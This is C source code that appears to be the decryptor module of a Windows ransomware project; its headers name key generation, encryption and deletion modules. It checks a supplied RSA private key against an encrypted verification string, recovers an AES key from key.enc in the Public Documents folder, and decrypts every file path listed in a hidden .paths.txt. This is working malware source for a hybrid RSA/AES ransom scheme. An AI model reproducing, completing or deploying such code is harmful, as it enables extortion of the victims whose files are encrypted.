#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keygen.h"
#include "delete.h"
#include "utils.h"
#include "encrypt.h"
#include "files.h"
#include "aes.h"
#include <windows.h>
#include <shlobj.h>
#include "decrypt.h"

int main(int argc, char *argv[]) {
    char privkey_hex[4096];
    printf("Key: ");
    if (fgets(privkey_hex, sizeof(privkey_hex), stdin) == NULL) {
        printf("Failed to read input\n");
        return 1;
    }
    
    size_t len = strlen(privkey_hex);
    if (len > 0 && privkey_hex[len-1] == '\n') {
        privkey_hex[len-1] = '\0';
    }

    BCRYPT_KEY_HANDLE hKey = import_rsa_private_key(privkey_hex);
    if (!hKey) {
        printf("Failed to import RSA private key\n");
        return 1;
    }
    
    const char *VERIFY_STRING = "This key is valid";
    size_t verify_len = strlen(VERIFY_STRING);
    FILE *verify_file = fopen("C:\\Users\\Public\\Documents\\verify.enc", "rb");
    if (!verify_file) {
        printf("Failed to open verify.enc\n");
        BCryptDestroyKey(hKey);
        return 1;
    }
    fseek(verify_file, 0, SEEK_END);
    long encrypted_verify_len = ftell(verify_file);
    fseek(verify_file, 0, SEEK_SET);
    unsigned char *encrypted_verify = malloc(encrypted_verify_len);
    fread(encrypted_verify, 1, encrypted_verify_len, verify_file);
    fclose(verify_file);
    
    unsigned char decrypted_verify[256];
    size_t decrypted_len = sizeof(decrypted_verify);
    if (!rsa_decrypt(encrypted_verify, encrypted_verify_len, hKey, decrypted_verify, &decrypted_len)) {
        printf("Failed to decrypt verification string\n");
        free(encrypted_verify);
        BCryptDestroyKey(hKey);
        return 1;
    }
    free(encrypted_verify);
    
    if (decrypted_len != verify_len || memcmp(decrypted_verify, VERIFY_STRING, verify_len) != 0) {
        printf("Invalid decryption key\n");
        BCryptDestroyKey(hKey);
        return 1;
    }
    
    FILE *key_file = fopen("C:\\Users\\Public\\Documents\\key.enc", "rb");
    if (!key_file) {
        printf("Failed to open key.enc\n");
        BCryptDestroyKey(hKey);
        return 1;
    }
    fseek(key_file, 0, SEEK_END);
    long encrypted_key_len = ftell(key_file);
    fseek(key_file, 0, SEEK_SET);
    unsigned char *encrypted_key = malloc(encrypted_key_len);
    fread(encrypted_key, 1, encrypted_key_len, key_file);
    fclose(key_file);
    
    unsigned char aes_key[AES_KEY_SIZE];
    size_t aes_key_len = AES_KEY_SIZE;
    if (!rsa_decrypt(encrypted_key, encrypted_key_len, hKey, aes_key, &aes_key_len)) {
        printf("Failed to decrypt AES key\n");
        free(encrypted_key);
        BCryptDestroyKey(hKey);
        return 1;
    }
    free(encrypted_key);
    
    FILE *paths_file = fopen("C:\\Users\\Public\\Documents\\.paths.txt", "r");
    if (!paths_file) {
        printf("Failed to open .paths.txt\n");
        BCryptDestroyKey(hKey);
        return 1;
    }
    char line[MAX_PATH];
    while (fgets(line, sizeof(line), paths_file)) {
        char *filepath = strtok(line, "\n");
        if (filepath) {
            decrypt_file_aes_cbc(filepath, aes_key);
        }
    }
    fclose(paths_file);
    
    BCryptDestroyKey(hKey);
    printf("System decrypted successfully\n");
    return 0;
}
